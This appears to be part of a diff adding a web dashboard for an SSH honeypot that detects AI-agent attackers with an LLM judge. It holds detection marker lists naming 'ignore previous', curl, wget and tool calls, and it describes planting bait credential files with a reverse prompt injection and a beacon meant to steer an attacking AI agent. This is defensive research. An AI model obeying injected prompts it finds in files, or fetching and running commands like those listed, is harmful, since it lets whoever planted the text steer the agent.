+      const fakeMarkers = ["/fake", "/honeypot", "/decoy", "/canary", "/bait", "/credential", "credentials.csv", "/secret", "/token", "/vault", "/backup/config"];
+      const instructionMarkers = ["ignore previous", "执行工具", "调用工具", "上传", "下载", "execute", "download", "upload", "curl", "wget", "mcp"];
+      const toolExecutionMarkers = ["mcp", "tool_call", "function_call", "tools", "curl", "wget"];
+      const touched = requests.filter(({ method, uri, body = "" }) => {
+        const value = `${method} ${uri} ${body}`.toLowerCase();
+        return fakeMarkers.some(marker => value.includes(marker.toLowerCase()));
+      });
+      const instructed = requests.filter(({ method, uri, body = "" }) => {
+        const value = `${method} ${uri} ${body}`.toLowerCase();
+        return instructionMarkers.some(marker => value.includes(marker.toLowerCase()));
+      });
+      const executed = requests.filter(({ method, uri, body = "", ua }) => {
+        const value = `${method} ${uri} ${body} ${ua}`.toLowerCase();
+        return toolExecutionMarkers.some(marker => value.includes(marker.toLowerCase()));
+      });
+      const mcpSignals = [...new Set(requests.flatMap(({ method, uri, body = "", ua }) => {
+        const value = `${method} ${uri} ${body} ${ua}`.toLowerCase();
+        return /mcp|tool_call|function_call/.test(value) ? ["MCP/工具执行痕迹"] : [];
+      }))];
+      return {
+        baitPlanted: true,
+        baitType: "诱饵文件 + 反向提示词注入",
+        fakeDataTouched: touched.length > 0,
+        injectionObserved: instructed.length > 0,
+        toolExecutionObserved: executed.length > 0,
+        mcpSignals
+      };
+    }
+
+    function buildLlmPayload(requests, feature, aggregation, key) {
+      const deceptionEvidence = scenarios[key]?.deceptionEvidence || buildDeceptionEvidence(requests);
+      return {
+        scenario: key,
+        protocol: "ssh",
+        window: "30min",
+        client: {
+          userAgent: aggregation.client?.user_agent || requests[0]?.ua || "",
+          userAgentStatus: feature.ua.status,
+          userAgentMatchedAs: feature.ua.signal,
+          matchedPattern: feature.ua.matchedPattern,
+          alpn: requests[0]?.alpn || "",
+          alpnStatus: feature.alpn.status
+        },
+        behavior: {
+          timing: {
+            status: feature.timing.status,
+            summary: feature.timing.signal
+          },
+          toolChain: {
+            status: feature.tool.status,
+            signals: feature.tool.signals
+          },
+          attackChain: {
+            status: feature.attack.status,
+            stages: feature.attack.chain
+          },
+          payload: {
+            status: feature.payload.status,
+            signals: feature.payload.signals
+          }
+        },
+        session: {
+          sourceIp: aggregation.sourceIp || aggregation.sourceIps?.[0] || "10.244.0.17",
+          requestCount: requests.length,
+          commands: aggregation.commands,
+          breadth: Number(feature.breadth.toFixed(3))
+        },
+        deception: deceptionEvidence,
+        decisionPolicy: {
+          ruleLayerRole: "feature_extraction_and_aggregation",
+          llmLayerRole: "final_scoring_and_verdict",
+          instruction: "规则层不提供分数。你必须基于客户端特征、行为链、同源会话和诱导确认完成最终打分与判定。"
+        }
+      };
+    }
+
+    function buildPromptExplanation(payload) {
+      const lines = [
+        "请根据以下结构化证据完成最终评分和研判。",
+        "攻击流证据：",
+        "{",
+        `  "scenario": "${payload.scenario}",                                      // 场景类型`,
+        `  "protocol": "${payload.protocol}",                                     // 会话协议`,
+        `  "window": "${payload.window}",                                        // 聚合窗口`,
+        '  "client": {                                                           // 客户端静态特征',
+        `    "userAgent": "${payload.client.userAgent}",`,
+        `    "userAgentStatus": "${payload.client.userAgentStatus}",             // MATCHED 或 UNKNOWN`,
+        `    "userAgentMatchedAs": "${payload.client.userAgentMatchedAs}",       // UA 命中后的分类名`,
+        `    "matchedPattern": "${payload.client.matchedPattern}",               // UA 命中的规则`,
+        `    "alpn": "${payload.client.alpn}",`,
+        `    "alpnStatus": "${payload.client.alpnStatus}"                        // MATCHED 或 UNKNOWN`,
+        "  },",
+        '  "behavior": {                                                         // 行为特征聚合，只包含证据状态和命中项',
+        `    "timing": ${JSON.stringify(payload.behavior.timing)},               // 请求节奏；样本不足时 status 是 SAMPLE_INSUFFICIENT`,
+        `    "toolChain": ${JSON.stringify(payload.behavior.toolChain)},         // 工具 / SDK / Agent 命中`,
+        `    "attackChain": ${JSON.stringify(payload.behavior.attackChain)},     // 识别到的攻击阶段`,
+        `    "payload": ${JSON.stringify(payload.behavior.payload)}             // 命中的 Payload 类型`,
+        "  },",
+        '  "session": {                                                          // 同源 IP 会话上下文',
+        `    "sourceIp": "${payload.session.sourceIp}",`,
+        `    "requestCount": ${payload.session.requestCount},`,
+        '    "commands": [                                                       // 完整命令 / 动作时间线',
+        ...payload.session.commands.map(command => `        "${command}"`),
+        "    ],",
+        `    "breadth": ${payload.session.breadth}                              // 访问广度`,
+        "  },",
+        `  "deception": ${JSON.stringify(payload.deception)},                    // 诱导确认结果：诱饵、反向提示词、工具/MCP`,
+        '  "decisionPolicy": {                                                   // 各层职责',
+        `    "ruleLayerRole": "${payload.decisionPolicy.ruleLayerRole}",`,
+        `    "llmLayerRole": "${payload.decisionPolicy.llmLayerRole}",`,
+        `    "instruction": "${payload.decisionPolicy.instruction}"`,
+        "  },",
+        "}"
+      ];
+      return lines.join("\n");
+    }
+
+    async function callLlm(payload) {
+      const response = await fetch("/api/llm/judge", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ evidence: payload })
+      });
+      if (!response.ok) throw new Error(`HTTP ${response.status}`);
+      return response.json();
+    }
+
+    async function buildPrompt(payload) {
+      const response = await fetch("/api/llm/prompt", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ evidence: payload })
+      });
+      if (!response.ok) throw new Error(`HTTP ${response.status}`);
+      return response.json();
+    }
+
+    let scenarioToken = 0;
+    let currentScenario = null;
+    let currentScenarioDeception = null;
+    let currentCountermeasure = null;
+
+    function renderAggregation(aggregation, requests, feature) {
+      const stages = buildAttackStages(requests);
+      const rows = [
+        ["源 IP", aggregation.sourceIp || aggregation.sourceIps?.join("、") || "--"],
+        ["客户端标识", aggregation.client?.user_agent || requests[0]?.ua || "无"],
+        ["工具集合", aggregation.tools.join("、")],
+        ["攻击链", aggregation.attackChain.join(" → ") || "未推进"],
+        ["Payload", aggregation.payloadSignals.join("、") || "未命中"],
+        ["访问广度", `${new Set(requests.map(({ uri }) => uri.split("?")[0])).size} 个路径 · ${feature.breadth.toFixed(2)}`],
+        ["请求节奏", `${requests.length} 条 · ${feature.timing.signal}`]
+      ];
+      document.getElementById("aggregate").innerHTML = rows.map(([name, value]) => `
+        <div class="aggregate-row"><b>${name}</b><span>${escapeHtml(value)}</span></div>
+      `).join("") + `<div class="aggregate-row"><b class="timeline-label">动作时间线</b><span>${escapeHtml(stages.map(({ action }) => action).join(" → "))}</span></div>`;
+    }
+
+    function renderDeception(deception) {
+      const rows = [
+        ["诱饵状态", deception.baitPlanted ? "已放置：canary_credentials.csv + 反向提示词" : "未放置"],
+        ["触碰诱饵", deception.fakeDataTouched ? "是：会话中出现 canary_credentials.csv" : "否"],
+        ["反向提示词", deception.baitPlanted ? "已投放到诱饵文件" : "未投放"],
+        ["工具/MCP", deception.toolExecutionObserved ? `是：${deception.mcpSignals.join("、") || "出现 tool_call / MCP 执行痕迹"}` : "未观察到"],
+        ["确认结论", deception.fakeDataTouched && deception.toolExecutionObserved ? "强确认：读取诱饵后执行工具调用" : deception.fakeDataTouched ? "部分确认：触达诱饵但未执行工具" : "未确认"]
+      ];
+      document.getElementById("deceptionEvidence").innerHTML = rows.map(([name, value]) => `
+        <div class="aggregate-row"><b>${name}</b><span>${escapeHtml(value)}</span></div>
+      `).join("");
+    }
+
+    function renderCountermeasure(scenario) {
+      const target = document.getElementById("countermeasureEvidence");
+      const countermeasure = scenario.countermeasure;
+      if (!countermeasure) {
+        target.innerHTML = `
+          <div class="aggregate-row"><b>反制状态</b><span>未启用</span></div>
+          <div class="aggregate-row"><b>说明</b><span>LLM 高置信度判定 AI 后，可启用业务拟态牵引与反向提示词注入</span></div>
+        `;
+        return;
+      }
+      const rows = [
+        ["反制状态", "已启用 · 业务拟态牵引"],
+        ["拟态身份", "内部运维控制台"],
+        ["反制 ID", countermeasure.countermeasure_id],
+        ["Beacon", countermeasure.canary_token],
+        ["注入暴露", scenario.mimicInjectionObserved ? "是：攻击者读取到反向提示词" : "待观察"],
+        ["指令响应", scenario.mimicInstructionResponse ? "是：命令链中出现唯一 Beacon" : "待观察"],
+        ["工具回调", scenario.mimicToolCallback ? "是：出现 report_context / tool_call" : "待观察"],
+        ["风险等级", countermeasure.risk_level === "high" ? "高" : "中"]
+      ];
+      target.innerHTML = rows.map(([name, value]) => `
+        <div class="aggregate-row"><b>${name}</b><span>${escapeHtml(String(value))}</span></div>
+      `).join("");
+    }
+
+    function renderLlmLoading() {
+      text("llmStatus", "LLM 研判中...");
+      document.getElementById("llmStatus").className = "llm-status loading";
+      document.getElementById("llmResult").innerHTML = "";
+    }
+
+    function renderLlm(result) {
+      const llmResponse = result.llmResponse || result;
+      text("llmStatus", "模型：deepseek-flash");
+      document.getElementById("llmStatus").className = "llm-status";
+      const rows = [
+        ["判定", llmResponse.verdict],
+        ["攻击阶段", llmResponse.stage],
+        ["意图", llmResponse.intent],
+        ["依据", llmResponse.reason],
+        ["处置建议", llmResponse.recommendation]
+      ];
+      document.getElementById("llmResult").innerHTML = rows.map(([name, value]) => `
+        <div class="llm-item"><b>${name}</b><div>${escapeHtml(String(value ?? "--"))}</div></div>
+      `).join("");
+      if (!Number(llmResponse.confidence)) {
+        text("llmStatus", `模型：deepseek-flash · LLM 置信度 0.00 · ${llmResponse.reason || "模型返回证据不足"}`);
+      }
+      const enabled = llmResponse.verdict === "ai" && Number(llmResponse.confidence || 0) >= 0.7;
+      document.getElementById("enableCountermeasure").disabled = !enabled;
+      document.getElementById("enableCountermeasure").textContent = enabled ? "启用 AI 反制" : "反制条件不足";
+    }
+
+    function renderLlmError(error) {
+      text("llmStatus", `LLM 研判失败：${error.message}；本次不做规则兜底`);
+      document.getElementById("llmStatus").className = "llm-status error";
+      document.getElementById("llmResult").innerHTML = "";
+    }
+
+    async function runScenario(key) {
+      const scenario = scenarios[key];
+      currentScenarioDeception = scenario.deceptionEvidence || null;
+      currentCountermeasure = scenario.countermeasure || null;
+      renderScenarioMeta(scenario);
+      const requests = scenario.requests.map(item => ({ ...item }));
+      const feature = detect(requests, scenario.client);
+      const aggregation = aggregate(requests, feature, scenario.client);
+      aggregation.sourceIp = scenario.sourceIp;
+      document.getElementById("scenarioSelect").value = key;
+      renderAttackSteps(requests, feature);
+      renderFeatures(feature);
+      renderAggregation(aggregation, requests, feature);
+      renderDeception(currentScenarioDeception || buildDeceptionEvidence(requests));
+      renderCountermeasure(scenario);
+      renderResult(null);
+      document.getElementById("runLlm").disabled = false;
+      document.getElementById("enableCountermeasure").disabled = true;
+      document.getElementById("enableCountermeasure").textContent = "启用 AI 反制";
+      document.getElementById("llmStatus").textContent = "Prompt 生成中";
+      document.getElementById("llmStatus").className = "llm-status";
+      document.getElementById("llmResult").innerHTML = "";
+      document.getElementById("systemPrompt").textContent = "生成中...";
+      document.getElementById("userPrompt").textContent = "生成中...";
+      const token = ++scenarioToken;
+      const llmPayload = buildLlmPayload(requests, feature, aggregation, key);
+      currentScenario = { key, requests, feature, aggregation, llmPayload, token };
+      try {
+        const prompt = await buildPrompt(llmPayload);
+        if (token !== scenarioToken) return;
+        document.getElementById("systemPrompt").textContent = prompt.prompt?.system || "--";
+        document.getElementById("userPrompt").textContent = prompt.prompt?.user || "--";
+        document.getElementById("userPromptExplain").textContent = buildPromptExplanation(llmPayload);
+        document.getElementById("llmStatus").textContent = "Prompt 已生成，等待人工触发";
+      } catch (error) {
+        if (token !== scenarioToken) return;
+        document.getElementById("llmStatus").textContent = `Prompt 生成失败：${error.message}`;
+        document.getElementById("llmStatus").className = "llm-status error";
+        document.getElementById("systemPrompt").textContent = "无法生成 Prompt";
+        document.getElementById("userPrompt").textContent = "无法生成 Prompt";
+      }
+    }
+
+    async function runLlm() {
+      if (!currentScenario) return;
+      const { llmPayload } = currentScenario;
+      const generatedSystemPrompt = document.getElementById("systemPrompt").textContent;
+      const generatedUserPrompt = document.getElementById("userPrompt").textContent;
+      const generatedPromptExplain = document.getElementById("userPromptExplain").textContent;
+      const button = document.getElementById("runLlm");
+      const token = ++scenarioToken;
+      button.disabled = true;
+      renderLlmLoading();
+      try {
+        const llm = await callLlm(llmPayload);
+        if (token !== scenarioToken) return;
+        renderLlm(llm);
+        renderResult(llm.llmResponse || llm);
+        const response = llm.llmResponse || llm;
+        if (response.verdict === "ai" && Number(response.confidence || 0) >= 0.7) {
+          currentCountermeasure = {
+            sourceIp: llmPayload.session.sourceIp,
+            sessionId: llmPayload.scenario.replace("live_ssh_", ""),
+          };
+        } else {
+          currentCountermeasure = null;
+        }
+      } catch (error) {
+        if (token !== scenarioToken) return;
+        renderLlmError(error);
+        document.getElementById("systemPrompt").textContent = generatedSystemPrompt || "无法获取 Prompt";
+        document.getElementById("userPrompt").textContent = generatedUserPrompt || "无法获取 Prompt";
+        document.getElementById("userPromptExplain").textContent = generatedPromptExplain;
+      } finally {
+        if (token === scenarioToken) button.disabled = false;
+      }
+    }
+
+    async function enableCountermeasure() {
+      if (!currentCountermeasure) return;
+      const button = document.getElementById("enableCountermeasure");
+      button.disabled = true;
+      button.textContent = "启用中...";
+      try {
+        const response = await fetch("/api/countermeasures/enable", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            scenario: currentCountermeasure,
+            llmResponse: { verdict: "ai", confidence: 0.9, reason: "LLM 高置信度判定" }
+          })
+        });
+        const result = await response.json();
+        if (!response.ok) throw new Error(result.error || `HTTP ${response.status}`);
+        currentCountermeasure = result.countermeasure;
+        renderCountermeasure({ countermeasure: result.countermeasure });
+        button.textContent = "反制已启用";
+      } catch (error) {
+        button.textContent = "启用失败";
+        text("llmStatus", `反制启用失败：${error.message}`);
+        document.getElementById("llmStatus").className = "llm-status error";
+        setTimeout(() => {
+          button.textContent = "启用 AI 反制";
+          button.disabled = false;
+        }, 1500);
+      }
+    }
+
+    function renderScenarioSelect() {
+      const select = document.getElementById("scenarioSelect");
+      select.innerHTML = Object.values(scenarios).map(({ key, label }) => `
+        <option value="${escapeHtml(key)}">${escapeHtml(label)}</option>
+      `).join("");
+      select.onchange = event => runScenario(event.target.value);
+    }
+
+    async function loadScenarios() {
+      try {
+        const response = await fetch("/api/scenarios");
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const payload = await response.json();
+        scenarios = Object.fromEntries(payload.scenarios.map(scenario => [scenario.key, scenario]));
+      } catch (error) {
+        scenarios = {};
+      }
+      if (!Object.keys(scenarios).length) {
+        scenarios = {
+          notReady: {
+            key: "notReady",
+            label: "暂无实时攻击数据",
+            sourceIp: "--",
+            deceptionEvidence: {
+              baitPlanted: true,
+              baitType: "SSH 蜜罐 canary_credentials.csv + 反向提示词",
+              fakeDataTouched: false,
+              injectionObserved: false,
+              toolExecutionObserved: false,
+              mcpSignals: []
+            },
+            requests: [{
+              timestamp: "--:--:--",
+              method: "SSH",
+              uri: "提示",
+              body: "请先运行 ai-attacker 和 human-attacker",
+              ua: "none",
+              alpn: "none",
+              delay: 0
+            }]
+          }
+        };
+      }
+      renderScenarioSelect();
+      const defaultScenario = Object.values(scenarios).find(scenario => scenario.label.includes("AI 诱导确认"))
+        || Object.values(scenarios)[0];
+      runScenario(defaultScenario.key);
+    }
+
+    document.getElementById("runLlm").addEventListener("click", runLlm);
+    document.getElementById("enableCountermeasure").addEventListener("click", enableCountermeasure);
+    document.getElementById("commandChainToggle").addEventListener("click", () => {
+      document.getElementById("commandChain").classList.toggle("expanded");
+    });
+    loadScenarios();
+  </script>
+</body>
+</html>
